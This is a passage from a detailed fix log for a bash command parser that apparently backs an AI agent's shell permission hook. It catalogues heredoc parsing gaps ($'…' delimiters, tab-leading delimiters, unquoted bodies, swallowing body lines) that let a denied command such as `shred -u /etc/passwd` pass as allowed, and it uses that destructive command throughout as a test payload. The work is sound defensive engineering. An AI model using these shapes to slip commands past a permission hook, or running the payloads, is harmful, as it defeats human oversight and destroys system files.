so a future edit to the terminator set cannot quietly turn `<<<x` into a
heredoc with the delimiter `<x`.

**R7-M16 and R7-M17 are round 6's guarantees re-scored on round 7's parser**:
fixing the scanner did not weaken the exact-line rule or the deliberate
scanner/reader asymmetry. R7-M2 is the one a future round is most likely to
reintroduce, because "quoted delimiters get their own branch" reads as the
tidier design; it now fails 52 ways.

**Every new test was watched to fail on the round-6 parser first** — a `cp -a`
copy of the tree with round 6's `bash_command_parser.py` dropped in; `git
checkout` is never used on this shared checkout. On round 6:

```
TestRound7HeredocDelimiterIsAWholeWord      83 failures
TestRound6HeredocTerminatorIsAnExactLine   378 failures  (the delimiter axis)
TestHeredocAndCasePatternDoors              44 failures  (the 22 new doors)
                                           ---
                                           505
```

### 14.6 Found and RECORDED, not fixed

§13.6's list stands. Three additions, none of them round-7 regressions.

1. **HIGH — an unquoted heredoc delimiter means bash EXPANDS the body, and no
   parser here reads the body at all.** Identical at HEAD, round 6 and round 7.

   ```
   cat <<EOF
   $(shred -u /etc/passwd)
   EOF
   echo done

     bash        -> runs shred, then echoes done   (measured, SHRED_RAN)
     every rev   -> ['cat', 'echo done']  ->  allow
   ```

   With a QUOTED delimiter (`<<'EOF'`) bash does not expand and the parsers are
   right. The unquoted spelling is the commonest heredoc in the wild, so this
   is the largest remaining hole in heredoc handling — larger than anything
   rounds 4-7 closed — and it is a **fail-open by default**: the body is
   treated as inert data because that is the assumption, not because anything
   checked. **Recorded for `tasks/35_parser_fails_open_by_default.md` Phase 0**,
   whose §3 item 1 asks for exactly this list: every point where the tokenizer
   proceeds without knowing it is right. The confidence signal is available and
   cheap — the delimiter's quoting is known at the moment the heredoc is
   parsed. Not fixed here: reading heredoc bodies is a new behaviour with its
   own cost curve, and this round is a narrow blocker fix.

2. **MEDIUM, disclosed and accepted — `MAX_SUBSTITUTION_DEPTH = 64` turns
   HEAD's `deny` into `ask` across depths 65…991.** The direction is safe, and
   §13.1 chose it deliberately over the `allow` it replaced. Two things §13
   did not say, and should have:

   - **Under YOLO / auto-approve an `ask` resolves to `allow`, while a `deny`
     is terminal.** This repo ships a `/yolo` skill that auto-allows every
     permission request for a session. So "safe direction" is a statement about
     the *default* prompting path, not about every configuration the operator
     can be in. It is still the right trade against round 5's explicit `allow`,
     but it is not free.
   - **The cap could sit near 400 and recover `deny` across the realistic
     band.** Re-measured through the validator, HEAD's first `RecursionError` is
     at depth **993** for `$(`/`<(` and **497** for `$((`; a cap of 400 is under
     both, so it would still stop the raise while restoring `deny` for 65…399 —
     which is the whole band any crafted input would realistically use. R6-M15
     pins the cap at 64 (raising it to 400 fails 36 ways), so this is a
     deliberate change with a test to update, not a tweak. **Recorded as an
     option; the cap is unchanged this round**, per the review's instruction.

3. **INFO — task 31's `_NON_SEPARATOR_FORMS` fd-dup expectations, revised by
   round 5, are bash-correct.** The five rows (`cmd 3>&1`, `cmd 0<&3`,
   `cmd >&-`, `cmd 2>&-`, and the `>&2` form) now expect `["cmd"]`, i.e.
   `argc=0`, and bash agrees: the fd word is consumed by the redirection.
   Task 31's original pin (which left the fd word in the argument list) was the
   quirk. Worth stating plainly because the regression floor is phrased as
   "still assert what task 31 said", and here round 5 correctly *stopped*
   asserting it.

### 14.7 Residual risk after round 7

- **Still not installed.** Unchanged, and still the largest exposure: every fix
  in §9 through §14 is live in the working tree only. `~/.claude/hooks/` has
  none of it until someone re-runs `./install-claude-config.sh`. Operator
  action.
- **`main()` still fails OPEN.** Round 7 changes nothing there.
  `tasks/34_nul_byte_fail_open.md`.
- **Heredoc BODIES are still never read** — §14.6 item 1, the biggest remaining
  heredoc hole, and a task-35 Phase 0 input.
- **A delimiter containing `$(`, `$((` or a backtick refuses the heredoc**
  rather than reproducing bash's absorption. Fails toward `ask`/`deny`,
  measured, pinned (R7-M9), and identical to HEAD — but it IS a divergence from
  bash and should be named as one rather than left in a comment.
  > **CORRECTION (round 8).** "Identical to HEAD" was measured only on the
  > PLAIN door shape (`cat <<D / body / D / payload`). Over the 18-residual
  > axis it is not identical: on `cat <<$(echo E) / <first body line> /
  > <terminator> / shred …`, 34 of 36 cells run the payload, and HEAD hides 8
  > of them where round 7 hides **10** — and 2 of round 7's are a genuine
  > `deny → allow` (`residual = " cat <<-Z"`, both operators). Round 8
  > re-measured this and found it **byte-identical in round 7 and round 8**, so
  > it is a pre-existing fail-open of the refusal strategy, not something
  > either round introduced. It is NOT fixed here — round 8's brief was two
  > blockers and no other scope — and it is filed for round 9 in §15.6.
- **Round 8 adds `$'…'` and `$"…"` to the refused set**, on the same terms and
  with the same residual-trap caveat, measured in §15.4. Refusing is not free:
  the body text is handed back to the tokenizer, and body text can itself open
  a heredoc or an unterminated quote. What the refusal does guarantee — over
  180 measured cells — is that it can never turn a `deny` into an `allow`; the
  worst it does is fall through to `ask`.
- **`MAX_SUBSTITUTION_DEPTH = 64`** — §14.6 item 2, with the YOLO caveat.
- **The two substitution scanners still deliberately disagree with the
  tokenizer** about what closes a heredoc, because bash does (§13.2). Round 7
  strengthens rather than weakens this: they now share the *delimiter* reading
  with the tokenizer while keeping their own *terminator* reading, which is
  exactly bash's split. R7-M17 fires on any attempt to unify.
- **The five items of §13.6**, of which #1 and #3 are toward `allow` and both
  are identical at HEAD.
- **`([[ … ]])` glued, with no space, still mis-splits** toward `ask` (§9.2).
- **The lesson round 7 adds, because it is a new one.** §13.7 said the thing to
  distrust is "a claimed direction with no oracle behind it". True, and round 7
  adds: **the thing to distrust next is a correct fix's interaction with the
  accidents it removes.** Round 6's exact-line rule was right, was measured,
  and was pinned — and it still shipped an `allow` regression, because HEAD's
  wrongness in one place had been compensating for HEAD's wrongness in another.
  Neither defect was visible while both were present. The practical form of the
  lesson: **when a change makes an existing rule stricter, re-run the corpora
  with the inputs that the OLD looseness used to absorb** — here, every
  delimiter the truncating scanner could not spell. That is a differential
  against HEAD, not against the previous round, and it is why the `HEAD -> r7`
  column is reported alongside `r6 -> r7` throughout §14.4. The delimiter axis
  now exists so the next round inherits the sweep rather than the lesson.
- Everything else in §8.9, §9.8, §10.10, §11.10, §12.10 and §13.7 stands
  unchanged, as corrected in place.

## 15. Fix log (round 8 — fixer, after the round-7 review FAILED)

Round 7's review confirmed the round-7 fix and found **two `deny → allow`
regressions round 7 itself introduced**. Both are delimiter-word defects, both
are narrow, and both were invisible to every corpus round 7 added — which is
the real finding, and is corrected in §14.3 in place. Scope: exactly the two
blockers, the two missing corpus axes, and the documentation corrections.
Nothing else was touched.

Round 7's other claims were re-verified and stand: `scenario_check.py`
byte-identical, the self-test at 107/0, the depth band, the operator space, the
trap corpus, the five fail-open classes, the CRLF corpus, and the word rule
across every non-`$`-quoted spelling.

### 15.1 Blocker 1 — `$'…'` and `$"…"` in the delimiter word

bash's quote removal takes the `$` **away with the quotes**. Round 7's word
scanner opened a quote at `'`/`"` but never looked back at a preceding `$`,
which it had already appended to `parts` as an ordinary word character — so its
delimiter carried a `$` bash's does not, round 6's (correct) exact-line reader
never matched, and the body swallowed the rest of the script.

Measured on bash 5.3.9 with its `here-document at line 1 delimited by
end-of-file (wanted `X')` warning as the delimiter oracle:

| spelling | bash's delimiter | round 7's |
|---|---|---|
| `<<$'EOF'` | `EOF` | `$EOF` |
| `<<$"EOF"` | `EOF` | `$EOF` |
| `<<E$'x'F` | `ExF` | `E$xF` |
| `<<$''E` | `E` | `$E` |

Through the real hook path, `allow=[cat] deny=[shred]`:

```
cat <<$'EOF' / body / EOF / shred -u /etc/passwd
  HEAD    -> deny  ["cat $'EOF'", 'body', 'EOF', 'shred -u /etc/passwd']
  round 7 -> ALLOW ['cat']
  round 8 -> deny  (HEAD's answer, restored)
  bash    -> runs the payload
```

**The fix REFUSES the form** — `_parse_heredoc_delim` returns `(None, i, False)`
for `$'` / `$"` in the unquoted state, exactly as it already refuses `$(`, a
backtick and `$((`. This was the conservative option and it was taken
deliberately:

- ~~It is **not a new answer**. HEAD's alnum scan already refused these
  spellings (`$` is not alnum, so the delimiter came out empty), so refusing
  restores HEAD's answer rather than inventing a third one.~~
  **FALSE for the mid-word spellings — corrected in round 9.** Measured on
  HEAD's own `_parse_heredoc_delim`, the claim holds only when the `$` starts
  the word:

  | spelling | HEAD | round 7 | round 8/9 |
  |---|---|---|---|
  | `<<$'EOF'` | `None` (refused) | `$EOF` | `None` (refused) |
  | `<<$"EOF"` | `None` (refused) | `$EOF` | `None` (refused) |
  | `<<$''E` | `None` (refused) | `$E` | `None` (refused) |
  | `<<E$'x'F` | **`E`** (a heredoc HEAD OPENED) | `E$xF` | `None` (refused) |
  | `<<E$"x"F` | **`E`** | `E$xF` | `None` (refused) |
  | `<<E$'x'F.txt` | **`E`** | `E$xF.txt` | `None` (refused) |

  HEAD refused only `$'EOF'`, `$"EOF"` and `$''E`; for the mid-word spellings
  it came back with a non-empty delimiter. So the refusal **is** a new answer
  there — a deliberate loss of precision, not a restoration of HEAD's. That
  matters because "it fails toward `ask`" was the other half of the argument,
  and round 9 showed that half was false too (§16.1). The refusal is kept, but
  it is now REPORTED rather than silent.
- Decoding `$'…'` properly means the whole ANSI-C escape set — `\n \t \\ \' \"
  \a \b \e \f \v \r \0nnn \xHH \uHHHH \UHHHHHHHH \cX` — which is a second
  scanner inside a word scanner.
- `$"…"` is worse than hard: it is **gettext-translated**, so its value depends
  on `TEXTDOMAIN` and the locale's message catalogue and is **not a function of
  the script text at all**. No amount of decoding makes it decidable. A rule
  that is undecidable for one half of a class does not get a partial
  implementation in a security gate.

The boundary was measured, not assumed. An escaped `$` (`<<\$'EOF'` → `$EOF`),
a `$` inside quotes (`<<'A$'B` → `A$B`), `$X`, `${X}`, a trailing `$` and a bare
`$$` all still parse to bash's exact answer
(`test_a_dollar_next_to_a_quote_is_only_refused_when_bash_eats_it`,
13 spellings, every expectation read off the oracle).

**But the headline "refused only when bash eats it" is wrong, and round 9
corrects it.** `$$'EOF'` is the counter-example: bash's `$$` consumes the FIRST
`$`, so the trailing `'EOF'` is ordinary quote removal and bash's delimiter is
`$$EOF` — bash does **not** eat that `$` — yet the scanner sees `$'` at the
second character and refuses. Measured on bash 5.3.9 off the `wanted' oracle,
both operators:

| spelling | bash's delimiter | HEAD | round 8/9 |
|---|---|---|---|
| `<<$$'EOF'` | `$$EOF` | `None` | `None` (refused) |
| `<<$$"EOF"` | `$$EOF` | `None` | `None` (refused) |
| `<<$$` | `$$` | `None` | `$$` (exact) |

The divergence is conservative and HEAD-equal, so it costs nothing but
precision — the test covers the bare `$$` and not `$$'…'`, which is why the
claim survived. The honest statement is: **a `$` is refused when it is
IMMEDIATELY followed by a quote, whether or not bash eats it.**

### 15.2 Blocker 2 — `<<-` with a delimiter whose first character is a TAB

`<<-` strips leading tabs from the **candidate line**. It does not stop the
**delimiter** from beginning with a tab, because quote removal and escaping
make one an ordinary word character: `<<-'⇥EOF'`, `<<-"⇥EOF"` and `<<-\⇥EOF`
all have the delimiter `⇥EOF`, and round 7's `_parse_heredoc_delim` returned
that correctly. All three `closes_heredoc` copies then compared the
**tab-stripped line** against the **unstripped delimiter** — which can never
match, so the body never closed.

```
cat <<-'<TAB>EOF' / body / <TAB>EOF / shred -u /etc/passwd
  HEAD -> deny    round 7 -> ALLOW    round 8 -> deny
  bash -> runs the payload
```

**bash's actual rule was measured before anything was written**, over
{11 delimiter words} × {16 candidate lines} × {`<<`, `<<-`} = **352 cells**:

> a line closes the body iff `line == delimiter`, **or** — under `<<-` only —
> `lstrip_tabs(line) == delimiter`.

`line == delimiter or (strip and lstrip_tabs(line) == delimiter)` matched in
**352/352**. Note what it is *not*: it is not "strip both sides". With the
delimiter `⇥EOF` the line `EOF` does **not** close — stripping is not undone —
and with the delimiter `EOF` the line `␣EOF` does not close either, because only
TABS are stripped.

The fix is one shared helper, `BashCommandParser._heredoc_line_starts`, used by
all three copies: it returns `[pos]` for `<<` and `[pos, pos_past_leading_tabs]`
for `<<-`, raw first.

**The change is confined by construction, not by hope.** If the delimiter does
not begin with a tab, a raw match implies a stripped match (nothing was
stripped), so the added offset answers identically — no behaviour moves. If it
does begin with a tab, the stripped offset can never match, so the two offsets
are **mutually exclusive** and their order is immaterial. Mutation R8-M9 (swap
the order) confirms it empirically: its *only* new failure is the test that
asserts the documented order, and no behavioural test moves.

### 15.3 The corpus axes that let both through — §14.3's claim, corrected

§14.3 claimed the delimiter gap was "fixed structurally, not by adding the ten
witnesses". It was not, and §14.3 now says so in place. The 13-entry axis is a
list of **spellings**; it has no quoting-form dimension and no `<<-` ×
leading-whitespace dimension. Two axes are added, as products with the existing
grid:

- **`<<-` × leading whitespace**, appended to
  `_HEREDOC_TERMINATOR_FUZZ_DELIMITERS`: `'⇥EOF'`, `"⇥EOF"`, `\⇥EOF`, `'⇥⇥EOF'`
  and the boundary row `'␣EOF'` (a space is not a tab, so it was always fine and
  is kept so an over-stripping fix is caught too). The grid goes 13 → **18
  spellings**, 468 → **648 cells**, bash runs the payload in **630**. Over those
  648: **HEAD hides 92, round 7 hides 72, round 8 hides 0.** Every one of round
  7's 72 is a `<<-` row; under plain `<<` round 7 compared the raw line and was
  already right, which is why one operator of each new spelling passes on round
  7 and the other does not.
- **Quoting form**, as its own corpus (`_HEREDOC_DOLLAR_QUOTING_SPELLINGS`)
  rather than a grid row, because the parser *refuses* these and so cannot
  offer the grid's "hides nothing" guarantee — see §15.4.
- **20 rows appended to the standing `_HEREDOC_AND_PATTERN_DOORS`** (64 → 84):
  both axes in the shortest shape, no residual trap. bash runs the payload in
  all 20; HEAD reports it in 20/20, **round 7 in 6/20**, round 8 in 20/20.
- **`TestRound8HeredocQuotingFormsAndTabLeadingDelimiters`, 10 methods / 64
  subtests**, with bash as the oracle for every premise row.

Eight of those ten methods fail on the round-7 parser. The two that do not are
deliberate: `test_bash_removes_the_dollar_with_the_quotes` is a pure oracle
assertion with no parser in it, and `test_a_tab_leading_delimiter_survives_
quote_removal` pins `_parse_heredoc_delim`, which round 7 already got right —
blocker 2 lived in `closes_heredoc`, not in the delimiter scan.

### 15.4 What refusing actually buys, measured

Refusing is not free. The body text is handed back to the tokenizer, and body
text can itself open a heredoc (` cat <<Z`) or an unterminated quote
(` echo 'x`) that swallows the payload. So the `$`-quoting corpus is held to a
**different and more honest property** than the grid's: not "nothing is
hidden", but **"a refusal can never launder a `deny` into an `allow`"**.

Over 5 spellings × 18 residuals × 2 operators = **180 cells**, bash runs the
payload in all 180:

| | deny | ask | allow |
|---|---|---|---|
| HEAD | 148 | 32 | 0 |
| round 7 | 0 | 0 | **180** |
| round 8 | 130 | 50 | **0** |

The 18 cells that move HEAD's `deny` to round 8's `ask` are ones where HEAD only
reached `deny` by accident of the PREFIX terminator match that round 6 removed
as a blocker of its own — the §14.7 lesson, recurring. `ask` is the safe
direction: it falls through to the native prompt.

> **Round 9 correction — the `0 allow` column above is an ARTIFACT OF THE
> CORPUS, not a property of round 8.** `_heredoc_terminator_case` always builds
> the trap line as `terminator + residual`, so whatever a swallow launders has
> the TERMINATOR (`ExF`, `EOF`) as its head word — a word no allowlist entry
> names — and the answer was pinned at `ask` before the parser was consulted.
> The corpus could not have produced an `allow` however broken the parser was,
> so the property it "asserted" was unfalsifiable. Put the swallowing construct
> on a body line of its OWN and round 8 reaches `allow` in 50 of 60 cells, 18 of
> them a HEAD `deny`. See §16.1 and §16.3.

### 15.5 Verification

| | round 7 | round 8 |
|---|---|---|
| suite | 1500 passed / 1 skipped / 2304 subtests | **1510 passed / 1 skipped / 2608 subtests** |
| pre-existing failures (task 22, NOT this task) | 6 | 6, identical |
| `bash_command_parser.py` self-test | 107 / 0 | **107 / 0** |
| `tests/scenario_check.py` | 2 FAIL (pre-existing) | **byte-identical output** |
| the 18 blocker rows (real hook path) — see the note below | 14 allow / 4 deny | **18 deny — HEAD's answer** |
| delimiter-axis grid, 648 cells / 630 executed | hides 72 | **hides 0** |
| `$`-quoting corpus, 180 cells / 180 executed | 180 allow | **0 allow** |
| CRLF grid, 30 cells | hides 0 | **hides 0** |
| doors corpus | 64 rows | **84 rows, 0 hidden, 0 laundered** |
| operator space | 21024 cases | **21024, unchanged** |
| path/trap corpus | 240 cases | **240, unchanged** |
| depth band 65…300, 4 carriers + write targets | 0 allow | **0 allow** |
| the five fail-open classes, real hook PROCESS | answer | **answer (2 deny, 3 ask; rc 0, non-empty stdout)** |
| real traffic (2211 distinct / 4141 occurrences) | — | **0 verdict / 0 split / 0 write-target changes vs round 7** |
| mutation matrix | 17, 16 caught | **12, 11 caught + NO-OP control survived** |

> **Round 9 correction — "the 18 blocker rows" were never named, and
> "round 7 → 18 ALLOW" is not reproducible.** The natural 18-row set is
> blocker 1's 5 `$`-quoting spellings x {`<<`, `<<-`} = 10 rows, plus
> blocker 2's 4 tab-leading spellings x {`<<`, `<<-`} = 8 rows, each in the
> shortest shape `cat <<SPELL / body / TERM / shred -u /etc/passwd`; bash runs
> the payload in all 18. Round 7 answers **14 allow / 4 deny** on that set, not
> 18 allow: the 4 denies are the tab-leading spellings under plain `<<`, which
> §15.3 in this very document says round 7 already handled ("under plain `<<`
> round 7 compared the raw line and was already right"). Re-measured in round 9,
> HEAD **18 deny**, round 8 **18 deny**, round 9 **18 deny**.

**Real-traffic differential.** 2211 distinct commands (4141 occurrences),
re-harvested from `~/.claude/bash_hook_debug.log` + its five rotated `.gz`
archives + `~/.claude/permission_requests.jsonl`, replayed under the real
`SettingsLoader` on the repo workspace (`allow=295 deny=9 ask=0`, asserted), 0
parse exceptions in every pass, verdict distribution `ask=1620 allow=591`.

```
round 7 -> round 8:   verdict 0    split 0    write-target 0
HEAD    -> round 8:   verdict 2    split 10   write-target 0
HEAD    -> round 7:   verdict 2    split 10   write-target 0
```

**Round 8 is a no-op on real traffic**, and `HEAD -> round 8` is identical to
`HEAD -> round 7` down to the index sets — not merely the same counts. Not one
delimiter in 2211 real commands uses `$'…'`, `$"…"` or a tab-leading word,
which is precisely why both axes stayed invisible for five rounds. The two
verdict changes are §13.4's, both `ask -> allow`, and both were re-proved
bash-faithful here with `cat` and `node` shadowed:

```
cat > …/fix_trunc.js <<'JS' … JS / node …/fix_trunc.js
  bash actually ran : ['cat', 'node']
  HEAD reported     : ['cat', '// must still parse', 'fs.writeFileSync(mf,m',
                       "console.log('…'", 'JS', 'node …']      -> ask
  round 8 reported  : ['cat', 'node …']                        -> allow
```

HEAD over-reported four JS *body fragments* as commands, which is what made it
`ask`. Round 8 reports exactly the two commands bash runs. The direction is
toward `allow` and it is a faithfulness correction, not a loosening.

### 15.6 Mutation matrix — 12 mutations, 11 caught, 1 NO-OP control

Every mutant was applied to a throwaway `/tmp` copy of the repo; the checkout
was never written to. A mutant counts as CAUGHT only if it fails tests the
**NO-OP control** does not — the control's own 2 failures are path-dependent
(`test_dot_alias_does_not_over_match_relative_path`,
`test_escaping_relative_path_is_not_workspace_binary`) and appear in *any* run
from a copied tree.

That control earned its place. The first run of this matrix used `pytest -x`,
which stopped at those 2 baseline failures, and **all 12 mutants — including
the control — reported CAUGHT**. The matrix was worthless and only the control
said so.

| id | mutation | verdict |
|---|---|---|
| R8-M1 | drop the `$'`/`$"` refusal (= round 7, blocker 1) | CAUGHT (5 tests) |
| R8-M2 | refuse only `$'`, not `$"` | CAUGHT (4) |
| R8-M3 | refuse only `$"`, not `$'` | CAUGHT (5) |
| R8-M4 | over-refuse: any bare `$` in the delimiter | CAUGHT (3) |
| R8-M5 | line starts: stripped offset only (= round 7, blocker 2) | CAUGHT (7) |
| R8-M6 | line starts: raw offset only (never strip under `<<-`) | CAUGHT (12) |
| R8-M7 | `lstrip` the DELIMITER's tabs instead of adding the raw offset | CAUGHT (37) |
| R8-M8 | strip SPACES as well as tabs under `<<-` | CAUGHT (2) |
| R8-M9 | swap the offset order (stripped first) | CAUGHT (1) — **behaviour-preserving**; only the order assertion fires, which is the evidence for §15.2's mutual-exclusion argument |
| R8-M10 | **NO-OP CONTROL** (comment only) | **SURVIVED**, as it must |
| R8-M11 | revert the union in the TOKENIZER copy only | CAUGHT (5) |
| R8-M12 | revert the union in BOTH SCANNER copies only | CAUGHT (1) |

R8-M7 is the "obvious" alternative fix the brief offered — strip the same
leading tabs from the *delimiter* before comparing. It is **wrong**, and the
oracle says why: with the delimiter `⇥EOF` it would close on the line `EOF`,
which bash does not. It breaks 37 tests.

**R8-M12 initially SURVIVED**, and fixing that is the one place round 8's tests
got stronger rather than merely wider. Reverting the scanners does not hide
`shred` outright: the substitution's extent scan runs to end of input, the
closing `)` is never found, and the extent comes back **one character short** —
so `shred -u /etc/passwd` is reported as `shred -u /etc/passw`, which still
prefix-matches `Bash(shred:*)` and still denies. The first version of
`test_the_three_closes_heredoc_copies_ask_the_same_question` asserted only that
`shred` appeared somewhere, and passed. The witness that exposes it puts the
payload **last and bare**, so the truncation eats its *name*:

```
echo $(cat <<-'<TAB>EOF' / body / <TAB>EOF / ) ; shred

  union in all three copies -> ['echo', 'shred', 'cat']   deny
  union in the tokenizer only -> ['echo', 'cat', 'shre']  ASK   (backtick: 'shr')
  bash -> runs shred
```

The test now asserts the whole split and the decision, for both the `$(…)` and
the backtick carrier.

### 15.7 Found and RECORDED, not fixed

1. **The `$(`-in-delimiter refusal has a 2-cell `deny → allow` on residual-trap
   shapes.** §14.7's "identical to HEAD" was measured only on the plain door
   shape. Over the 18-residual axis, `cat <<$(echo E) / …`, 34 of 36 cells run
   the payload; HEAD hides 8 and rounds 7 **and 8** each hide 10, of which 2 are
   `deny → allow` (`residual = " cat <<-Z"`, both operators). It is
   **byte-identical in round 7 and round 8** — untouched by this round's edits —
   so it is a pre-existing property of the refusal strategy, not a regression
   either round introduced. Not fixed: round 8's brief was two blockers and no
   other scope. §14.7 now records it. **Round 9 input.**

   > **Round 9 correction — "2 cells" understates it by 6x, for exactly the
   > corpus-shape reason §15.4 now records.** Measured on the body-swallow
   > shape (the swallowing construct as a standalone body line, payload last
   > and bare): 3 substitution spellings x 6 swallow lines x 2 operators = 36
   > cells, bash runs the payload in all 36. HEAD **12 deny / 24 allow**;
   > round 7 and round 8 **6 deny / 30 allow** — of which **6 are a HEAD `deny`
   > reaching `allow`**, not 2. Still byte-identical at round 7 and round 8, so
   > still genuinely pre-existing. **Closed in round 9** by the same marker that
   > closes §16.1: `_parse_heredoc_delim` reports the refusal, and the 36 cells
   > read **6 deny / 30 ask / 0 allow**.
2. **`tests/test_integration_permission_request.py::TestAgentWrittenDecisions`
   fails 4 tests, and pollutes 2 more in
   `test_unit_permissions_mcp.py::TestEndToEndWithWaitLoop`.** Not this task:
   the class passes in isolation and fails only after earlier classes in its own
   file, none of the 6 tests references the parser, and the failures are
   **identical at round 7 and round 8** — confirmed by running the full suite in
   two `/tmp` copies at the same path (8 failed / 1497 passed / 2 skipped in
   both, the extra 2 being the path-dependent pair). This is task 22 territory
   (`tasks/22_agent_permission_flows/state.md` is modified by a concurrent
   session).

   > **Round 9 correction — the last sentence was wrong.** `tests/run_all_tests.py`
   > **is** clean: **1517 ran, OK, 1 skipped** at round 8 and **1525 ran, OK,
   > 1 skipped** at round 9. The 6 failures are a *pytest collection-order*
   > artifact and nothing else: they reproduce from just two files
   > (`pytest tests/test_integration_permission_request.py
   > tests/test_unit_permissions_mcp.py` -> 6 failed / 180 passed), and
   > `TestAgentWrittenDecisions` alone passes 7/7. Neither file contains a
   > single reference to `BashCommandParser` or `bash_command_parser`, so no
   > parser revision can move them, and they are identical under HEAD's,
   > round 7's, round 8's and round 9's parser. Stop attributing them to
   > task 32; they are task 22's isolation problem.
3. **Two door LABELS collide** (cosmetic, pre-existing, not fixed). Round 7's
   `_heredoc_delimiter_word_doors` sanitises a spelling to a label with
   `c if c.isalnum() else "_"`, which maps both `E'O'F` and `E"O"F` to
   `heredoc_delimiter_word_ltlt_E_O_F`. Both rows are still in the corpus and
   both are still tested — only the `subTest` label is ambiguous, so a failure
   in one reads as the other. Round 8's own rows carry explicit names for
   exactly this reason (`'⇥EOF'` and `"⇥EOF"` would otherwise both reduce to
   `__EOF_`).
4. **The bash oracle used for a first pass of this round's measurement was
   wrong and self-flattering**, and is recorded so it is not rebuilt. It ran
   `cat <<D … / echo MARKER` and looked for `MARKER` in stdout — but `cat`
   echoes the heredoc body, which *contains* the marker text, so every cell
   reported "the trailer ran". It made all 24 rows of the `<<-` rule look
   identical. The suite's own probe is the right one and is what §15.2's 352
   cells use: shadow `shred` and `cat` as shell **functions** and empty `PATH`,
   so the signal is "bash treated this word as a COMMAND" and no real binary is
   reachable. **Never use an oracle whose success token also appears in the
   input.**

### 15.8 Residual risk after round 8

Everything in §14.7 stands, as corrected in place there, plus:

- **`$'…'` and `$"…"` delimiters now refuse the heredoc.** A named divergence
  from bash, in the same family as the `$(` refusal, with the same
  residual-trap caveat (§15.4).
  ~~and the same guarantee: never `allow`.~~
  **REFUTED in round 9, and self-contradictory when written**: §15.7 item 1 in
  this same document records the `$(` refusal — the family this claim puts
  `$'…'` in — reaching `allow`. Round 8's refusal had no such guarantee; the
  `0 allow` it rested on was an artifact of the residual-trap corpus (§15.4's
  round-9 note). Round 9 makes the guarantee real and restates it:

  > **A refused heredoc delimiter can never reach `allow`, because the refusal
  > is REPORTED as `TRUNCATED_SUBSTITUTION_COMMAND` — an unmatchable
  > sub-command — so the compound command can only fall to `ask`.** It is a
  > property of the emission, not of any corpus. §16.

  `$"…"` cannot be fixed by decoding at all — it is locale-dependent, proved
  in §16.2 with a real gettext catalogue — so a future round wanting precision
  here can at best handle `$'…'` with no backslash in it, where ANSI-C decoding
  is provably the identity.
- **The `$(` refusal's fail-open** (§15.7 item 1) — pre-existing, measured at
  2 cells in round 8, re-measured at **6 HEAD-`deny` cells of 36** in round 9,
  and **closed** there by the same marker.
- **The lesson round 8 adds.** §14.7 said to distrust "a correct fix's
  interaction with the accidents it removes". Round 8 adds the one about
  coverage claims: **an axis closes the shapes it enumerates and nothing else.**
  Round 7 added a 13-entry axis, a 468-cell grid, a 30-cell corpus, 22 doors and
  17 mutations, and wrote "fixed structurally" — and then shipped two blockers
  *in the very thing the axis was about*, because the axis varied which
  characters a delimiter contains and never varied the form of its quotes or
  the place of its whitespace. The practical form: **before claiming a gap is
  closed structurally, name the dimensions the new axis does NOT vary.** For a
  shell word those are, at least: character set, quoting form, whitespace
  placement, escaping, line ending, and length. Round 8's two axes close the
  second and third. The fourth and fifth were closed in rounds 6 and 7. Nobody
  has swept length.

## 16. Fix log (round 9 — fixer, after the round-8 review FAILED)

Round 8's brief was two blockers. Both are fixed and the reviewer independently
re-derived them; **nothing in §15.1's `$'…'`/`$"…"` scan, §15.2's
`_heredoc_line_starts` or the 396-cell terminator rule is touched here.** Round
9's brief is one structural gap, one undercounted measurement of the same root
cause, and five documentation corrections. No other scope.

### 16.1 Blocker — a REFUSED heredoc can still reach `allow`

`_parse_heredoc_delim` declines four delimiter spellings: `$(`, a backtick,
`$'…'` and `$"…"`. **bash opens a heredoc body for every one of them.** Rounds
5–8 justified the refusal with "it fails toward `ask`, the safe direction". That
was never a property of the parser. Refusing hands the BODY back to the
tokenizer, and a first body line that opens another **swallowing** construct
eats the real terminator *and the payload*, leaving a split whose every head is
allowlisted:

```
cat <<E$'x'F / cat <<Z / ExF / shred -u /etc/passwd
  HEAD    -> deny   ['cat xF', 'shred -u /etc/passwd']
  round 8 -> allow  ["cat E$'x'F", 'cat']
  round 9 -> ask    ["cat E$'x'F", 'cat', '__unparsed_nested_substitution__']
  bash    -> runs `cat`, then `shred`

cat <<E$'x'F / echo 'x  / ExF / shred …    round 8 -> allow  (an apostrophe in
                                                              body text suffices)
cat <<E$'x'F / body     / ExF / shred …    round 8 -> deny   (control: no swallow)
```

Measured over **{5 `$`-quoting spellings} × {6 swallow lines} × {`<<`, `<<-`} =
60 cells**, bash runs the payload in all 60:

| | deny | ask | allow |
|---|---|---|---|
| HEAD | 28 | 0 | 32 |
| round 8 | 10 | 0 | **50** |
| round 9 | 10 | 50 | **0** |

**18 of round 8's 50 are a HEAD `deny` reaching `allow`.**

**The fix reuses the idiom the file already ships.** `MAX_SUBSTITUTION_DEPTH`'s
three gates do not truncate in silence — they report the truncation as
`TRUNCATED_SUBSTITUTION_COMMAND`, a sub-command deliberately spelled so nothing
downstream can re-tokenize it into a friendlier head, so it matches no
`Bash(<binary>:*)` an operator would write, and so the compound command falls to
`ask`. Round 9 does the same for a declined delimiter:

- `_parse_heredoc_delim` returns a fourth element, `declined`. It is `True`
  **only** for the four constructs above — the ones bash opens a body for and
  this scanner will not compute a delimiter for — and `False` for every other
  `None` (a `<<<` here-string, a bare/empty `<<`, an unterminated or
  line-spanning quote), all of which are heredocs **bash does not open either**,
  where a marker would cost a prompt on text bash never runs.
- `_tokenize_with_quotes` emits `('CMD_SUBST', TRUNCATED_SUBSTITUTION_COMMAND,
  i)` when `declined` is set, then falls through to the operator scan exactly as
  before. `parse_with_offsets` already turns any `CMD_SUBST` into a sub-command,
  so nothing else changes: the marker rides the ordinary route, it survives
  `_split_on_operators` (which reads groups, while `parse_with_offsets` reads the
  raw token list), and `_normalize_command` keeps only `WORD`/`QUOTED` tokens so
  the marker never contaminates a real sub-command's text.
- The two substitution scanners take the flag and ignore it, with the reason
  written at the call site: there the delimiter only decides where the
  substitution ENDS; the body still reaches the tokenizer through that
  substitution's own `CMD_SUBST`, which is where the refusal gets reported.
  Verified through four carriers (`$( )`, backtick, `$(( ))`, `case` arm).

That makes the property true **by construction**: *a refused heredoc delimiter
can never reach `allow`, because the decision is made by an unmatchable head.*
It is no longer a fact about which residuals a corpus happened to contain.

The cost is precision, and it is named: 18 of the 60 cells move HEAD's `deny` to
`ask`. `ask` is the native prompt. `allow` is not.

### 16.2 `$"…"` is provably undecidable from the script text — settled

